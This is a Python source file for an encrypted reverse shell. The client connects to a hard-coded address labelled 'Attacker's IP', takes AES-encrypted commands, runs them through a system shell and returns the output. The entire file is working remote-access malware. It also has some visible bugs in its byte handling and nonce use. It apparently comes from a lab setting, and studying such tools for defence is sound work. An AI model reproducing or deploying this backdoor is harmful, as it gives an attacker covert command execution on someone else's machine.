import socket
import sys
import subprocess
import os
from Crypto.Cipher import AES

HOST = "10.0.2.4" # Attacker's IP
PORT = 1234
BUFFER = 4096
SEP = "<sep>"
KEY = b'V8voC+SrEhFGfdVitiCBShKilUbuXOmEHC3b1XNTa4U='
error_outputs = ["Invalid command", "No such file or directory"]
exit_inputs = ['exit', 'quit', 'q', 'close', 'shutdown', 'bye', 'goodbye']

def shell():
    while True:
        try:
            encrypted = client_socket.recv(BUFFER)
            tag = encrypted[0:16]
            nonce = encrypted[16:31]
            ciphertext = encrypted[31:]
            cipher = AES.new(KEY, AES.MODE_OCB, nonce=nonce)
            try:
                command = cipher.decrypt_and_verify(ciphertext, tag)
            except ValueError:
                print("The message was modified")
                sys.exit(1)
            command = command.decode()

            split_command = command.split()
            is_empty = not command.strip()

            if is_empty:
                output = error_outputs[0]
                cwd = os.getcwd()
                message = output + SEP + cwd
                message = message.encode()
                cipher = AES.new(KEY, AES.MODE_OCB)
                ciphertext, tag = cipher.encrypt_and_digest(message)
                ciphertext = tag + cipher.nonce + ciphertext
                client_socket.send(ciphertext)
                continue
            elif split_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(split_command[1:]))
                    output = ""
                except FileNotFoundError as exception:
                    output = str(exception)
                except IndexError:
                    output = error_outputs[1]
            elif command.lower() in exit_inputs:
                client_socket.close()
                break
            else:
                try:
                    process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE,
                                               stderr = subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    if stdout:
                        output = stdout
                    else:
                        output = stderr
                except Exception as exception:
                    output = str(exception)

            cwd = os.getcwd()
            message = output + SEP + cwd
            message = message.encode()
            cipher = AES.new(KEY, AES.MODE_OCB)
            ciphertext, tag = cipher.encrypt_and_digest(message)
            ciphertext = tag + nonce + ciphertext
            client_socket.send(ciphertext)

        except Exception as exception:
            print("Error: %s" % exception)
            break


def main():
    global client_socket
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        cwd = os.getcwd()
        client_socket.send(cwd)
        shell()

    except Exception as exception:
        print("Connection error: %s" % exception)
    finally:
        client_socket.close()


if __name__ == "__main__":
    main()
